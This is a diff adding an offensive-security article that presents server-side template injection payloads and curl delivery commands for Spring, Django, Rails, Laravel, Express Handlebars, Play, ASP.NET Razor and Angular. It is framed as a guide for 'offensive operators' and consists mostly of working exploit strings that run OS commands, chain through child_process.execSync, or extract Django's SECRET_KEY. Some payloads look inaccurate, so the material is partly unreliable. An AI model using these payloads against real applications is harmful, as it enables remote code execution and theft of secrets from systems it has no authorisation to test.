@@ -1,0 +1,205 @@
+---
+title: Framework-Specific Attacks in Web Applications
+description: Learn to exploit SSTI vulnerabilities in web frameworks like Django,
+  Laravel, and Spring Boot.
+keywords:
+- SSTI
+- web frameworks
+- Spring Boot
+- Django Template Injection
+- Laravel Blade Injection
+- web application security
+- framework-specific attacks
+- server-side template injection
+- remote code execution
+- template engines
+---
+
+# Framework-Specific Attacks
+
+## Context
+
+The goal of this article is to enable offensive operators to exploit Server-Side Template Injection (SSTI) vulnerabilities within specific web frameworks by utilizing their unique syntax, primitives, and exploitation chains. It is assumed that the reader is familiar with template engines, server-side rendering, web application architecture, and basic SSTI techniques.
+
+## Theory
+
+### Framework-Specific SSTI Primitives
+
+Every web framework typically employs a specific template engine characterized by its unique syntax and execution context. Understanding these nuances is crucial for crafting effective exploitation payloads. The core principle of exploiting SSTI vulnerabilities involves recognizing how a template language provides access to backend objects or functions that can be abused. 
+
+Frameworks might unintentionally expose dangerous objects, methods, or bypasses due to insecure evaluation of templates. This vulnerability model allows attackers to execute arbitrary code or access sensitive information.
+
+### Attack Surface by Framework
+
+To execute a successful attack, it is essential to identify the template engine employed by a web application. This can be accomplished through error messages, leaked source code, or observed behavior. Once identified, an attacker can craft payloads using framework-specific syntax to test for code execution or access to sensitive objects. 
+
+The attack sequence involves escalating from proof-of-concept payloads to full remote code execution or data extraction by exploiting engine-specific features. Mastery of these techniques can enable an attacker to manipulate the application's backend processes effectively.
+
+## Practice
+
+### Spring Boot (Spring Expression Language - SpEL) SSTI Exploitation
+
+- **Payload:**
+
+  ```bash
+  ${T(java.lang.Runtime).getRuntime().exec('id')}
+  ```
+
+  This payload allows execution of an OS command via SpEL injection.
+
+- **Command Line:**
+
+  ```bash
+  curl -d "input=${T(java.lang.Runtime).getRuntime().exec('id')}" http://target/spring-endpoint
+  ```
+
+  Execute the crafted payload by sending it to a vulnerable endpoint.
+
+**Outcome:** Achieve OS command execution through SpEL injection.
+
+### Django Template Injection Exploitation
+
+- **Payload:**
+
+  ```python
+  {{ settings.SECRET_KEY }}
+  ```
+
+  This payload accesses sensitive Django settings through template injection.
+
+- **Command Line:**
+
+  ```bash
+  curl -d "input={{ settings.SECRET_KEY }}" http://target/django-endpoint
+  ```
+
+  Deliver the payload to a vulnerable Django endpoint.
+
+**Outcome:** Extract sensitive configuration data from Django settings.
+
+### Ruby on Rails ERB Template Injection
+
+- **Payload:**
+
+  ```ruby
+  <%= `id` %>
+  ```
+
+  This payload executes an OS command using ERB template injection.
+
+- **Command Line:**
+
+  ```bash
+  curl -d "input=<%= `id` %>" http://target/rails-endpoint
+  ```
+
+  Send the payload to Rails endpoint.
+
+**Outcome:** Execute arbitrary OS commands through ERB injection.
+
+### Laravel Blade Template Injection
+
+- **Payload:**
+
+  ```php
+  {{ system('id') }}
+  ```
+
+  This payload invokes PHP's `system()` function via Blade template injection.
+
+- **Command Line:**
+
+  ```bash
+  curl -d "input={{ system('id') }}" http://target/laravel-endpoint
+  ```
+
+  Funnel the payload through the Laravel endpoint.
+
+**Outcome:** Achieve OS command execution via Blade injection.
+
+### Express Handlebars SSTI Exploitation
+
+- **Payload:**
+
+  ```javascript
+  {{#with "s" as |string|}}{{#with string.constructor as |cons|}}{{cons.prototype.eval("process.mainModule.require('child_process').execSync('id').toString()")}}{{/with}}{{/with}}
+  ```
+
+  This payload abuses Handlebars prototype pollution to execute commands.
+
+- **Command Line:**
+
+  ```bash
+  curl -d "input=<payload>" http://target/express-endpoint
+  ```
+
+  Dispatch the payload to the target endpoint.
+
+**Outcome:** Execute OS commands via Handlebars SSTI.
+
+### Play Framework Scala Template Injection
+
+- **Payload:**
+
+  ```scala
+  @{new java.lang.ProcessBuilder("id").start()}
+  ```
+
+  This payload uses Java ProcessBuilder through Scala template injection.
+
+- **Command Line:**
+
+  ```bash
+  curl -d "input=@{new java.lang.ProcessBuilder('id').start()}" http://target/play-endpoint
+  ```
+
+  Propagate the payload to a vulnerable endpoint.
+
+**Outcome:** Achieve command execution via Play Scala templates.
+
+### ASP.NET Razor Template Injection
+
+- **Payload:**
+
+  ```csharp
+  @{System.Diagnostics.Process.Start("cmd.exe", "/c whoami")}
+  ```
+
+  Execute Windows commands through Razor template injection.
+
+- **Command Line:**
+
+  ```bash
+  curl -d "input=@{System.Diagnostics.Process.Start('cmd.exe','/c whoami')}" http://target/aspnet-endpoint
+  ```
+
+  Transmit the payload to the endpoint.
+
+**Outcome:** Execute Windows commands via Razor SSTI.
+
+### Angular Template Injection (Client-Side)
+
+- **Payload:**
+
+  ```javascript
+  {{constructor.constructor('alert(document.domain)')()}}
+  ```
+
+  Trigger JavaScript execution via Angular template injection.
+
+- **Command Line:**
+
+  ```bash
+  curl -d "input={{constructor.constructor('alert(document.domain)')()}}" http://target/angular-endpoint
+  ```
+
+  Execute the payload on a vulnerable endpoint.
+
+**Outcome:** Run JavaScript in the client context using Angular template injection.
+
+## Tools
+
+- **curl**
+- **Burp Suite**
+- **wfuzz**
+- **ffuf**
